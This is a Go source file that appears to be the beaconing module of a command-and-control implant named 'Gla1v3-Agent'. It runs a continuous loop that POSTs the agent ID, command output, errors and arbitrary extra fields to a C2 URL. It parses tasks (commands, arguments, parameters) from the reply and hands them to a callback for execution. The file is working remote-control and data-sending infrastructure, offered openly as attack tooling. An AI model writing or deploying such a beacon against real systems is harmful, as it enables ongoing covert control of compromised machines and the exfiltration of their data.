package beacon

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"time"
)

// Beacon handles the beaconing loop to C2 server
type Beacon struct {
	agentID      string
	c2URL        string
	interval     time.Duration
	client       *http.Client
	seq          int
	tenantAPIKey string
}

// New creates a new beacon instance
func New(agentID, c2URL string, interval time.Duration, client *http.Client) *Beacon {
	return &Beacon{
		agentID:  agentID,
		c2URL:    c2URL,
		interval: interval,
		client:   client,
		seq:      0,
	}
}

// NewWithTenant creates a new beacon instance with tenant API key
func NewWithTenant(agentID, c2URL, tenantAPIKey string, interval time.Duration, client *http.Client) *Beacon {
	return &Beacon{
		agentID:      agentID,
		c2URL:        c2URL,
		interval:     interval,
		client:       client,
		seq:          0,
		tenantAPIKey: tenantAPIKey,
	}
}

// Payload represents a beacon payload
type Payload struct {
	AgentID string                 `json:"agent_id"`
	Seq     int                    `json:"seq"`
	Output  string                 `json:"output"`
	Error   string                 `json:"error"`
	TS      string                 `json:"ts"`
	Extra   map[string]interface{} `json:"-"` // Additional fields
}

// Response represents a beacon response from C2
type Response struct {
	Tasks []TaskInfo `json:"tasks"`
}

// TaskInfo represents task information from C2
type TaskInfo struct {
	ID       string            `json:"id"`
	Cmd      string            `json:"cmd"`
	Args     []string          `json:"args"`
	Type     string            `json:"type"`
	TaskType string            `json:"taskType"`
	Params   map[string]string `json:"params"`
	RunOnce  bool              `json:"runOnce"`
}

// Send sends a beacon to the C2 server
func (b *Beacon) Send(output, errStr string, extra map[string]interface{}) (*Response, error) {
	b.seq++
	
	// Build structured payload
	payload := map[string]interface{}{
		"agent_id": b.agentID,
		"seq":      b.seq,
		"output":   output,
		"error":    errStr,
		"ts":       time.Now().UTC().Format(time.RFC3339),
	}
	
	// Merge extra fields
	for k, v := range extra {
		payload[k] = v
	}
	
	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal beacon payload: %v", err)
	}
	
	req, err := http.NewRequest("POST", b.c2URL, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %v", err)
	}
	
	req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", b.agentID)
	
	// Send tenant API key if available
	if b.tenantAPIKey != "" {
		req.Header.Set("X-Tenant-API-Key", b.tenantAPIKey)
	}
	
	resp, err := b.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("beacon POST failed: %v", err)
	}
	defer resp.Body.Close()
	
	log.Printf("Beacon POST -> %s | Agent-ID: %s | seq=%d", resp.Status, b.agentID, b.seq)
	
	// Parse response for tasks
	var taskResp Response
	if err := json.NewDecoder(resp.Body).Decode(&taskResp); err != nil {
		// Not fatal - C2 might not always return tasks
		return &Response{}, nil
	}
	
	if len(taskResp.Tasks) > 0 {
		log.Printf("Received %d tasks from C2", len(taskResp.Tasks))
	}
	
	return &taskResp, nil
}

// Loop runs the beacon loop continuously
func (b *Beacon) Loop(getOutput func() (string, string), getExtra func() map[string]interface{}, onTasks func([]TaskInfo)) {
	for {
		// Get current output and extra info
		output, errStr := getOutput()
		extra := getExtra()
		
		// Send beacon
		resp, err := b.Send(output, errStr, extra)
		if err != nil {
			log.Printf("Beacon error: %v", err)
		} else if resp != nil && len(resp.Tasks) > 0 {
			// Execute tasks
			if onTasks != nil {
				onTasks(resp.Tasks)
			}
		}
		
		// Wait for next beacon
		time.Sleep(b.interval)
	}
}

// GetSeq returns the current sequence number
func (b *Beacon) GetSeq() int {
	return b.seq
}

// GetAgentID returns the agent ID
func (b *Beacon) GetAgentID() string {
	return b.agentID
}

// GetInterval returns the beacon interval
func (b *Beacon) GetInterval() time.Duration {
	return b.interval
}

// SetInterval updates the beacon interval
func (b *Beacon) SetInterval(interval time.Duration) {
	b.interval = interval
	log.Printf("Beacon interval updated to %v", interval)
}
